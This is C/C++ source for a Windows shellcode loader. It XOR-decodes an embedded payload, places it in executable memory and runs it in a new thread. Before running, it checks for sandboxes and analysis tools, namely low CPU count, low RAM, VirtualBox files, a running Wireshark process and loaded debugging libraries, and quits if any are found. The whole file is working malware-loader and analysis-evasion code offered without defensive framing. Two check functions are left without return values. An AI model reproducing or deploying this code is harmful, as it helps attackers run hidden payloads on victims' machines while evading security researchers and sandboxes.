#include "Header.h"

void XorAndInjectShellcode()
{
	BYTE* shellcode_executable = (BYTE*)VirtualAlloc(0, sizeof shellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	for (int i = 0; i < sizeof shellcode; i++)
	{
		shellcode_executable[i] = shellcode[i] ^ 0x13;
	}
	DWORD threadID;
	HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_executable, NULL, 0, &threadID);
	WaitForSingleObject(hThread, INFINITE);
}

bool CheckCPU()
{
	SYSTEM_INFO systemInfo;
	DWORD numberOfProcessors;

	// CHECK NUMBER OF LOGICAL PROCESSORS //
	GetSystemInfo(&systemInfo);
	numberOfProcessors = systemInfo.dwNumberOfProcessors;
	////////////////////////////////////////

	if (numberOfProcessors < 4) return true;
	else return false;
}

bool CheckRAM()
{
	MEMORYSTATUSEX memoryStatus;
	memoryStatus.dwLength = sizeof(memoryStatus);
	DWORD RAMMegaBytes;

	// CHECK PHYSICAL MEMORY AMOUNT //
	GlobalMemoryStatusEx(&memoryStatus);
	RAMMegaBytes = memoryStatus.ullTotalPhys / 1024 / 1024;
	//////////////////////////////////

	if (RAMMegaBytes < 4000) return true;
	else return false;
}

bool CheckVMFiles()
{
	WIN32_FIND_DATAA findFileData;
	bool anyFileExists;

	// SEARCH FOR FILES SPECIFIC FOR YOUR HYPERVISOR //
	HANDLE findFileHandle1 = FindFirstFileA("C:\\Windows\\System32\\VBox*.dll", &findFileData);
	//Change to VMWare when finilizing
	HANDLE findFileHandle2 = FindFirstFileA("C:\\Program Files\\Blablabla", &findFileData);
	anyFileExists = (findFileHandle1 != INVALID_HANDLE_VALUE || findFileHandle2 != INVALID_HANDLE_VALUE);
	///////////////////////////////////////////////////

	if (anyFileExists) {
		printf("Sandbox!");
		return true;
	} 
	else return false;
}

bool CheckRunningProcesses() {
	PROCESSENTRY32W processEntry = { 0 };
	processEntry.dwSize = sizeof(PROCESSENTRY32W);
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	WCHAR processName[MAX_PATH + 1];
	if (Process32FirstW(hSnapshot, &processEntry))
	{
		do
		{
			StringCchCopyW(processName, MAX_PATH, processEntry.szExeFile);
			CharUpperW(processName);
			if (wcsstr(processName, L"WIRESHARK.EXE")) exit(0);
		} while (Process32NextW(hSnapshot, &processEntry));
	}


}

bool CheckLoadedLibraries() {
	DWORD runningProcessesIDs[1024];
	DWORD runningProcessesBytes;
	EnumProcesses(runningProcessesIDs, sizeof(runningProcessesIDs), &runningProcessesBytes);
	for (int i = 0; i < runningProcessesBytes / sizeof(DWORD); i++)
	{
		HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, runningProcessesIDs[i]);
		if (!hProcess) continue;
		HMODULE processModules[1024];
		DWORD processModulesBytes;
		int s1 = EnumProcessModules(hProcess, processModules, sizeof(processModules), &processModulesBytes);
		for (int j = 0; j < processModulesBytes / sizeof(HMODULE); j++)
		{
			WCHAR moduleName[MAX_PATH + 1];
			GetModuleFileNameExW(hProcess, processModules[j], moduleName, MAX_PATH);
			CharUpperW(moduleName);
			if (wcsstr(moduleName, L"DBGHELP.DLL")) exit(0);
		}
	}

	
}


bool Sandboxed()
{
	if (CheckCPU() || CheckRAM() || CheckVMFiles() || CheckRunningProcesses() || CheckLoadedLibraries()) return true;
	else return false;
}

int main()
{
	if (Sandboxed()) return 0;
	XorAndInjectShellcode();
}